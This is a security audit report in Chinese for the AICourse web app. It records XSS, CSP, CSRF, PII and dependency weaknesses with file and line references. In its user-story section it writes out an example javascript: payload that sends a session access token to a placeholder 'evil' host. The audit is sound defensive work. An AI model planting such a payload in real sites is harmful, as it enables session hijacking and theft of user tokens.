# AICourse 安全审计(2026-07-23, v1.3.0 → v1.5.0 增量)

> 范围:仅审计上一轮(2026-06-29)之后的新增/大改代码。

## 段 3 · 缺口(优先)

- **XSS 防护三层缺口**:① `apps/web/index.html:11` `<script type="module" src="/index.tsx">` 缺 CSP meta / nonce;② 后端 `apps/api/src/main.ts:30` `imgSrc` 只允许 `'self'+data:+coresg-normal.trae.ai`,但 16 张新 CMS 表的 `testimonials.avatar` / `industries.icon` / 公开图片字段走任意 URL 域 — 一旦后端返回被 block,fallback 又渲染空;③ `Layout.tsx:193` top-nav 直接 `<Link to={item.path}>`,无任何 scheme 校验,admin 在 `AdminSettingsPage.tsx:1388-1396` 把 `path` 改成 `javascript:...` 一行即 clickable XSS;`Layout.tsx:460` footer 用 `link.path.startsWith('http')` 判外链,`javascript:` / `data:` / `vbscript:` 全部漏过 → `Layout.tsx:476` 走 `<Link to>` 渲染为 `<a href="javascript:...">`,见段 1 故事。
- **CSRF token 缺失**:`apps/api/src/modules/auth/auth.controller.ts:120` `sameSite='lax'` 防顶层导航 POST,但 `AdminSettingsPage.tsx:1019/1026/1033/1039/258-264` 13 个 PATCH/POST/DELETE mutation 仍带 cookie;非顶层 fetch(axios) 不会被 lax 拦截。
- **持久化/缓存策略分裂**:`authStore.ts:21-38` `partialize` 只存 user(OK);`apps/web/src/lib/api.ts:31,39` accessToken 走 `sessionStorage`;但 `apps/web/src/lib/learningEventsApi.ts:56` 死路径 `localStorage.getItem('accessToken')` 永为 `''` → L78 永远发 `Authorization: Bearer ` 空头。
- **CSP 覆盖面窄**:后端 `apps/api/src/main.ts:27-35` helmet CSP 只在 API 响应生效,SPA `index.html` 无 CSP meta;`Seo.tsx:85` 注入 `<script type="application/ld+json">{JSON.stringify(jsonLd)}</script>` 无 nonce 保护(目前 jsonLd 来自 prop 受控,但缺兜底)。
- **PII 留存**:`prisma/schema.prisma` AuditLog (L36-52) 写 `ipAddress` / `userAgent`,`AdminAuditLogsPage` 列表 0 脱敏,管理员可见所有用户 IP/UA。
- **Admin demo 旁路**:`router.tsx:127-129` `BindingsPage` `?demo=with-google` 绕过登录态渲染合成身份,生产构建仍可用。
- **Admin 表单无服务端 schema**:`AdminSettingsPage.tsx:1235-1248` `field.type==='json'` 用 `JSON.parse` 在前端,`apps/web/src/lib/cmsApi.ts:235-262` `getEnumTranslations` 返回 any;若后端 `ValidationPipe.whitelist` 不严,malformed `valueJson` 全过。

## 段 4 · 风险等级总结

- 🔴 **Critical 1** — `Layout.tsx:193` + `Layout.tsx:460/476` admin-controlled URL → `javascript:` XSS,加 `apps/web/src/features/admin/AdminSettingsPage.tsx:1388-1396` 整条 top-nav 字段无校验。
- 🔴 **Critical 2** — `apps/web/index.html:5-11` 缺 CSP meta,后端 `apps/api/src/main.ts:30` CSP 不覆盖 SPA;CMS 任意文本 XSS 零防护。
- 🟠 **High 1** — `apps/web/src/lib/learningEventsApi.ts:56/78` 死路径 + 空 `Authorization` 头,401 静默失败,审计/排障噪声。
- 🟠 **High 2** — `pnpm audit` 4 漏洞:`semver 6.0-6.3.1` ReDoS(L101+ paths,经 `bcrypt@node-pre-gyp>make-dir`)、`tmp<0.2.6` path traversal(`@nestjs/cli` 链)、`fast-uri` ReDoS(28 paths,`@nestjs/cli` 链)、`tmp<=0.2.3` symlink 1 项 low。
- 🟠 **High 3** — `prisma/schema.prisma:36-52` AuditLog 写 IP/UA PII 无脱敏,`AdminAuditLogsPage` 直展示。
- 🟡 **Medium 1** — CSRF:同上,`sameSite=lax` 不足护 admin PATCH/DELETE。
- 🟡 **Medium 2** — `AdminSettingsPage.tsx:1235-1248` JSON 字段无服务端 schema,malformed data 全过。
- 🟢 **Low 1** — `components/auth/AuthShell.tsx:214-222` CMS testimonial 直渲染,React text-escape OK 但 admin 品牌信任失败。
- 🟢 **Low 2** — `ErrorBoundary.tsx:46` `console.error('[ErrorBoundary] caught error:', error, info)`,`error.message` 可能含 fetch URL+query。
- 🟢 **Low 3** — `.npmrc` 强制 `npmmirror` 无 audit endpoint,`pnpm audit` 需手动加 `--registry https://registry.npmjs.org/` 才跑得通。

## 段 1 · 真实用户故事 + 入口断层

- 角色 **admin** 在 `/admin/settings` 改 footer 某 `link.path` 为 `javascript:fetch('//evil/'+sessionStorage.aicourse.accessToken)`,保存。实际:`AdminSettingsPage.tsx:1397-1406` 字段 `text` 无校验 → `cmsApi.ts:299-306` `getList` 返回 → `Layout.tsx:460` `link.path.startsWith('http')` false → 落到 `Layout.tsx:476` `<Link to={link.path}>` → react-router-dom v7 渲染 `<a href="javascript:...">`;用户点 footer 链接 → XSS 触发,`api.ts:31 sessionStorage.aicourse.accessToken` 被外泄(refresh_token 是 httpOnly 不可读,但 accessToken 够劫持当前 session 至 15 min)。
- 角色 **普通用户** 想访问 `/admin/dashboard`:实际是 `router.tsx:55-62` ProtectedRoute 读 `useAuthStore.user`,未登录跳 `/auth/login`;非 admin/super_admin 跳 `/`,已 OK。
- 角色 **未登录用户** 打开 `https://.../dashboard/settings/bindings?demo=with-google`:实际 `router.tsx:129` 公开路由 + `BindingsPage.tsx:111-131` 合成一个 demo identity 渲染完整页面,绕过空态。
- 角色 **admin 切暗色**:实际 `apps/web/src/stores/themeStore.ts:33` 写 `localStorage('theme')` + `apps/web/src/components/auth/AuthShell.tsx:53` 同步写,刷新主题留存 OK,但 `localStorage` 持久化与 `authStore.ts:36` 注释"never localStorage" 哲学分裂,潜在 confusion。

## 段 2 · 重复信息 / 卡住场景

- `learningEventsApi.ts:56,78` 死路径 + 空 Authorization,401 静默。
- `learningEventsApi.ts:65` sendBeacon 路径只带 cookie、不带 Authorization,与 L78 fetch fallback 行为分裂。
- `prisma/schema.prisma` EnterpriseInquiry(L41-60) 存 `email/phone/company/topic/description` 销售线索 PII,`AdminEnterprisePage.tsx:24-52` 列表无脱敏。
- `.npmrc` 强制 npmmirror 无 audit endpoint,`pnpm audit` 直接 `ERR_PNPM_AUDIT_ENDPOINT_NOT_EXISTS` 跑不通。
- `AdminSettingsPage.tsx:1309` `testimonials.avatar` 字段是 `text` 类型,admin 写任意 URL 暂未被前端组件消费(grep 0 命中 `<img src={testimonial.avatar}`),但 schema/接口已就绪,后续渲染层若加 `<img>` 即缺 URL 白名单。
- `AdminSettingsPage.tsx:1380-1382` `auth_providers.config` 字段 `json`,admin 可写入任意 JSON 但被前端 `BindingsPage.tsx:73-88` 仅取 `id/label/icon`,config 静默丢。
